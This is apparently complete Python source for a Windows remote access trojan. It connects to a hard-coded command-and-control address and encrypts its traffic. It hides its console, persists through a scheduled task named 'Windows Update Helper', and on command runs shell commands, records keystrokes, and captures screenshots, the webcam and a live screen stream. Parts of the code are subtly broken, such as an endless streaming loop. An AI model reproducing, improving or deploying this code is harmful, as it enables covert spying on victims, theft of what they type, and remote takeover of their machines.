import socket
import struct
import json
import os
import subprocess
import time
import random
import threading
import hashlib
import base64
import ctypes
from ctypes import wintypes

HOST = "192.168.122.1"
PORT = 4444
KEY = b"CrockKey2026!!CrockKey2026!!!!!"

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

def keystream(counter, length):
    out = b""
    c = counter
    while len(out) < length:
        h = hashlib.sha256(KEY + struct.pack("<I", c)).digest()
        out += h
        c += 1
    return out[:length]

def send_data(s, data, ctr):
    if isinstance(data, str):
        data = data.encode()
    ks = keystream(ctr[0], len(data))
    enc = bytes(a ^ b for a, b in zip(data, ks))
    ctr[0] += (len(data) + 31) // 32
    s.sendall(struct.pack(">I", len(enc)) + enc)

def recv_data(s, ctr):
    raw = recvall(s, 4)
    if not raw:
        return ""
    length = struct.unpack(">I", raw)[0]
    if length == 0 or length > 32*1024*1024:
        return ""
    buf = recvall(s, length)
    if not buf:
        return ""
    ks = keystream(ctr[0], len(buf))
    plain = bytes(a ^ b for a, b in zip(buf, ks))
    ctr[0] += (len(buf) + 31) // 32
    return plain.decode(errors="ignore")

def recvall(s, n):
    data = b""
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def persist():
    try:
        path = os.path.abspath(sys.argv[0] if 'sys' in dir() else __file__)
        import sys
        path = os.path.abspath(sys.argv[0])
        rl = "highest" if is_admin() else "limited"
        cmd = f'schtasks /create /tn "Windows Update Helper" /tr "{path}" /sc onlogon /rl {rl} /f'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
    except:
        pass

def exec_cmd(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=25, creationflags=0x08000000)
        out = (p.stdout or "") + (p.stderr or "")
        return out if out else "[empty]"
    except Exception as e:
        return str(e)

def take_screenshot():
    try:
        import mss
        from PIL import Image
        import io
        with mss.mss() as sct:
            mon = sct.monitors[1]
            img = sct.grab(mon)
            im = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
            buf = io.BytesIO()
            im.save(buf, format="BMP")
            return "IMG:" + base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return "screenshot fail: " + str(e)

def take_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "webcam fail"
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return "webcam fail"
        import io
        from PIL import Image
        im = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        buf = io.BytesIO()
        im.save(buf, format="BMP")
        return "IMG:" + base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return "webcam fail: " + str(e)

def proc_list():
    try:
        import psutil
        out = []
        for p in psutil.process_iter(['pid', 'name']):
            try:
                out.append(f"{p.info['pid']:5}  {p.info['name']}")
            except:
                pass
        return "\n".join(out) if out else "[empty]"
    except Exception as e:
        return str(e)

keylog = []
keylog_running = False
keylog_thread = None

def keylog_loop():
    global keylog_running
    try:
        from pynput import keyboard
        def on_press(key):
            if not keylog_running:
                return False
            try:
                keylog.append(key.char)
            except:
                keylog.append(f"[{key}]")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass

def keylog_start():
    global keylog_running, keylog_thread
    if keylog_running:
        return
    keylog_running = True
    keylog_thread = threading.Thread(target=keylog_loop, daemon=True)
    keylog_thread.start()

def keylog_stop():
    global keylog_running
    keylog_running = False

def keylog_dump():
    return "".join(keylog) if keylog else "[empty]"

def keylog_clear():
    keylog.clear()

def hide():
    try:
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except:
        pass

def main():
    hide()
    time.sleep(random.randint(15, 40))
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            send_ctr = [0x1337]
            recv_ctr = [0x1337]
            info = json.dumps({
                "u": os.getenv("USERNAME", "?"),
                "h": os.getenv("COMPUTERNAME", "?"),
                "a": 1 if is_admin() else 0
            })
            send_data(s, info, send_ctr)
            while True:
                cmd = recv_data(s, recv_ctr)
                if not cmd:
                    break
                reply = "unknown"
                if cmd == "ping":
                    reply = "pong"
                elif cmd == "info":
                    reply = info
                elif cmd == "persist":
                    persist()
                    reply = "ok"
                elif cmd == "screenshot":
                    reply = take_screenshot()
                elif cmd == "webcam":
                    reply = take_webcam()
                elif cmd == "proclist":
                    reply = proc_list()
                elif cmd == "keylog_start":
                    keylog_start()
                    reply = "keylog started"
                elif cmd == "keylog_stop":
                    keylog_stop()
                    reply = "keylog stopped"
                elif cmd == "keylog_dump":
                    reply = keylog_dump()
                elif cmd == "keylog_clear":
                    keylog_clear()
                    reply = "cleared"
                elif cmd == "stream_start":
                    send_data(s, "stream started", send_ctr)
                    streaming = True
                    while streaming:
                        frame = take_screenshot()
                        if frame.startswith("IMG:"):
                            send_data(s, "FRAME:" + frame[4:], send_ctr)
                        time.sleep(0.08)
                        # simple stop check omitted for brevity; server sends stream_stop
                    reply = "stream stopped"
                elif cmd.startswith("sh:"):
                    reply = exec_cmd(cmd[3:])
                send_data(s, reply, send_ctr)
            s.close()
        except:
            pass
        time.sleep(random.randint(8, 18))

if __name__ == "__main__":
    import sys
    main()
